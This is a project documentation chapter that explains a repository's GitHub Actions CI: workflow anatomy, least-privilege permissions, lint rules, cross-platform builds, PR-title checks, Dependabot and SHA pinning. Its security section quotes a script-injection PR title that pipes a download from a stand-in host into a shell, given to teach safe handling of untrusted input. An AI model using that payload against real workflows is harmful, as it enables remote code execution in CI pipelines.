# 04 — CI explained

**CI (continuous integration)** means: every time someone proposes a change,
robots check it automatically before a human even looks. On GitHub, those robots
are **GitHub Actions**, and their instructions live in `.github/workflows/`.

You'll see the result on every pull request:

- ✅ green: all checks passed.
- ❌ red: something failed. Click **Details** to see which step, and why.
- 🟡 yellow: still running.

Green CI doesn't mean a PR is _good_, only that it isn't _broken_ in any way the
robots know how to detect. You still review it.

## The anatomy of a workflow file

Every workflow is a YAML file with the same building blocks:

```yaml
name: CI # shown in the Actions tab
on: … # WHEN to run (events)
permissions: … # what the run is allowed to do
jobs: # WHAT to run
  checks: # a job id
    runs-on: ubuntu-latest # which kind of computer (a "runner")
    steps:
      - uses: actions/checkout@v7 # run a reusable "action" someone published
      - run: pnpm test # run a shell command
```

- **Events (`on`)**: things that happen on GitHub, such as a PR being opened or
  a push to `main`.
- **Jobs**: independent units of work. Jobs run **in parallel** on separate
  fresh computers unless one says `needs: other-job`.
- **Steps**: run one after another inside a job. If a step fails, the job stops
  and turns red.
- **`uses`** runs a pre-made **action** (a published, reusable step);
  **`run`** runs a shell command.
- **Runners**: GitHub's virtual machines, wiped clean after every job. For
  public repositories, the standard Linux, Windows and macOS runners are free.

## `ci.yml`, section by section

Open [`.github/workflows/ci.yml`](../../.github/workflows/ci.yml) next to this
page. Every line has a comment; here's the deeper "why".

### Triggers

```yaml
on:
  pull_request:
  push:
    branches: [main]
  workflow_dispatch:
```

- `pull_request` checks proposals **before** they merge.
- `push` to `main` checks the result **after** merging. Two PRs can each be
  green alone but break when combined; this catches that.
- `workflow_dispatch` adds a **Run workflow** button in the Actions tab.

**Pull requests from forks are safe.** For a PR from a fork, GitHub gives the
run a read-only token and **no access to secrets**. Strangers' code runs in a
throwaway sandbox that can't touch your repository. That's why Glossa never uses
the riskier `pull_request_target` event, which runs with write access.

### Permissions: least privilege

```yaml
permissions:
  contents: read
```

Each run gets a temporary `GITHUB_TOKEN`. This line limits it to _reading_ code.
If a dependency or action were ever malicious, it couldn't push commits, create
releases or edit issues.

### Concurrency

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
```

`${{ … }}` is an **expression**: GitHub fills in a value before running.
If you push three times quickly to one PR, only the newest run matters, so the
older ones are cancelled. Runs on `main` are never cancelled.

### Job `checks`: the fast gate (Linux)

| Step                             | What it catches                                                                                                                                                             | Run it yourself        |
| -------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------- |
| `actions/checkout`               | Downloads the code. `persist-credentials: false` stops the token being saved in `.git/config`, where later steps could read it.                                             | —                      |
| `pnpm/action-setup`              | Installs pnpm, using the version from `"packageManager"` in `package.json`.                                                                                                 | —                      |
| `actions/setup-node`             | Installs Node from `.nvmrc` and caches downloads between runs.                                                                                                              | —                      |
| `pnpm install --frozen-lockfile` | Installs exactly the versions in `pnpm-lock.yaml`. If someone changed `package.json` without updating the lockfile, this **fails** instead of quietly picking new versions. | `pnpm install`         |
| Format check                     | Code not formatted by Prettier.                                                                                                                                             | `pnpm format` fixes it |
| Lint                             | Likely bugs, React hook mistakes, **and Glossa's own rules** (see below).                                                                                                   | `pnpm lint`            |
| Type-check                       | Type errors, e.g. passing a string where a number belongs.                                                                                                                  | `pnpm typecheck`       |
| Unit tests                       | Behaviour changes: a function returning the wrong answer.                                                                                                                   | `pnpm test`            |

**`pnpm check` runs these same four checks locally.** Run it before pushing and
CI will almost never surprise you.

#### ESLint enforces two golden rules

[`eslint.config.mjs`](../../eslint.config.mjs) turns two promises from
`AGENTS.md` into automatic errors, so nobody (human or AI) can break them by
accident:

1. **No network.** In `src/`, using `fetch`, `WebSocket`, `XMLHttpRequest`,
   `navigator.sendBeacon`, Node's `http`/`https`/`net` modules, or Electron's
   `net` is a lint error.
2. **Pure core.** In `src/core/`, importing Electron, Node (`node:*`), React, or
   other app folders is an error, and so is reading the clock with `Date.now()`.
   Time must be passed in, so tests are repeatable.

These rules were tested by adding a file that breaks all of them: ESLint
reported all 9 violations, each message naming the rule in `AGENTS.md`.

### Job `build`: build and run the real app on Windows and macOS

```yaml
strategy:
  fail-fast: false
  matrix:
    os: [windows-latest, macos-latest]
runs-on: ${{ matrix.os }}
```

A **matrix** runs the same job once per value, in parallel, so you get
**Build (windows-latest)** and **Build (macos-latest)**. `fail-fast: false`
lets both finish even if one fails, so you see every problem at once.

Each run of the job does five things:

1. **Restore the AI models from the cache** (`actions/cache`). The cache `key`
   is a fingerprint of `scripts/fetch-models.mjs`, so the cache is reused until
   someone changes which models are pinned. Then it starts fresh.
2. **`pnpm fetch-models`** downloads anything the cache didn't have and
   re-checks every file's SHA-256 fingerprint either way. A cached file can't
   be swapped for a different one.
3. **`pnpm build:unpack`**: compile with electron-vite, then package with
   electron-builder into a runnable app folder (no installer), with the models
   inside. `CSC_IDENTITY_AUTO_DISCOVERY: false` tells electron-builder not to
   look for code-signing certificates; we don't have any yet (Step 7).
4. **End-to-end test on the packaged app** (`GLOSSA_E2E_PACKAGED=1`).
   Playwright launches the app _exactly as users would install it_, with
   Chromium's fake microphone playing a clip made by the OS's text-to-speech,
   then clicks Start, watches the overlay, clicks Stop and checks the summary.
   This proves the models and native onnxruntime files are bundled correctly on
   **both** platforms.
5. **On failure only** (`if: failure()`), upload the test report and
   screenshots as an **artifact**: a downloadable zip at the bottom of the
   run's summary page, kept for 7 days.

The job is still called `Build (…)` even though it does more now, because
your ruleset requires checks **by name**. Renaming it would leave the ruleset
waiting forever for a check that never reports.

## `pr-title.yml`: Conventional Commit titles

PRs are squash-merged, so **the PR title becomes the commit message on `main`**,
and the release tool reads those messages. This workflow fails the PR if the
title doesn't match:

```
^(feat|fix|docs|test|refactor|perf|build|ci|chore|revert|style)(\([a-z0-9._/-]+\))?!?: [^ ].*$
```

Read left to right:

| Piece                  | Meaning                                                                |
| ---------------------- | ---------------------------------------------------------------------- |
| `^(feat\|fix\|…)`      | Starts with one of the allowed types                                   |
| `(\([a-z0-9._/-]+\))?` | Optional lowercase scope in brackets, like `(overlay)` or `(deps-dev)` |
| `!?`                   | Optional `!` for breaking changes                                      |
| `: `                   | A colon and a space                                                    |
| `[^ ].*$`              | Then a description that doesn't start with a space                     |

It was tested against Dependabot's own title formats (which pass) and against
`Add pace meter` and `feat:missing space` (which fail). To fix a red check, just
**edit the PR title**; the check re-runs automatically.

### A real security lesson inside this file

```yaml
env:
  TITLE: ${{ github.event.pull_request.title }}
run: |
  if [[ "$TITLE" =~ $pattern ]]; then …
```

Anyone can type any PR title. If the script pasted `${{ github.event.pull_request.title }}`
**directly** into the shell command, a title like `x"; curl evil.sh | sh; #`
would become part of the command and run. This is called **script injection**,
and it has compromised real projects. Passing the title through an environment
variable (`$TITLE`) keeps it as plain data. **Rule:** never put
`${{ github.event.* }}` text inside `run:`; route it through `env:`.

## `dependabot.yml`: automatic update PRs

[`.github/dependabot.yml`](../../.github/dependabot.yml) isn't a workflow. It
configures **Dependabot**, a GitHub bot that opens update PRs every Monday:

- **One grouped PR** for all minor/patch npm updates, plus separate PRs for
  major versions (which can break things).
- **One grouped PR** for GitHub Actions updates.
- **`cooldown: 7 days`**: Dependabot won't propose a version until it's been
  public for a week. Attackers sometimes publish poisoned versions of popular
  packages, and those are usually caught within days. Security fixes skip the
  wait.
- **`ignore` rules**: TypeScript 7 is skipped because our lint tool doesn't
  support it yet. `@types/node` majors are skipped because they must match the
  Node version inside Electron (24), not the newest Node.

**Handling a Dependabot PR:** if CI is green, skim the changelog link in the PR
and squash-merge it. If it's red, open the failing step: often it's a real
breaking change. You can fix it in that PR, or close it with a comment and
Dependabot will try again with the next version.

## Pinning actions: tags vs commit SHAs

```yaml
- uses: actions/checkout@v7
- uses: pnpm/action-setup@ea17c68df8912ef543352723c149a84f56e3d413 # v6.1.0
```

A tag like `v7` is a movable label: whoever controls that repository can point
it at new code at any time. A commit **SHA** (the long hex string) can never
change.

- **`actions/*`** are made by GitHub itself, so we trust tags (easier to read).
- **Third-party actions** are pinned to a SHA, with the version in a comment. In
  March 2025 a popular third-party action (`tj-actions/changed-files`) had its
  tags repointed to malicious code that printed secrets into the build logs of
  thousands of repositories. Users who had pinned a SHA were unaffected.

Dependabot updates both kinds, including the version comment.

## When CI fails: a quick guide

1. On the PR, click **Details** next to the red check.
2. Expand the step with the ❌ and read from the **first** error message.
3. Fix it locally, then commit and push. CI re-runs by itself.

| Failure                      | Usual fix                                                                                                                                                                    |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Format check                 | `pnpm format`, commit the result                                                                                                                                             |
| `ERR_PNPM_OUTDATED_LOCKFILE` | `pnpm install`, commit `pnpm-lock.yaml`                                                                                                                                      |
| Lint / type-check            | Read the file:line in the log and fix the code                                                                                                                               |
| Unit tests                   | The log shows _expected_ vs _received_. Was the code or the test wrong?                                                                                                      |
| PR title                     | Edit the title on GitHub                                                                                                                                                     |
| Flaky (passes on retry)      | **Re-run failed jobs** button, top right. If it keeps happening, open an issue.                                                                                              |
| End-to-end test              | Download the `e2e-report-…` artifact from the bottom of the run's summary page and open `playwright-report/index.html`. The log also prints the talk time the test measured. |

## Making CI required

Checks only _block_ merging once you mark them **required**. After CI has run
once on GitHub, go back to [chapter 07](07-github-settings-checklist.md), step
5, and add these checks to the `Protect main` ruleset:

- `Checks (format, lint, types, tests)`
- `Build (windows-latest)`
- `Build (macos-latest)`
- `Conventional Commit title`
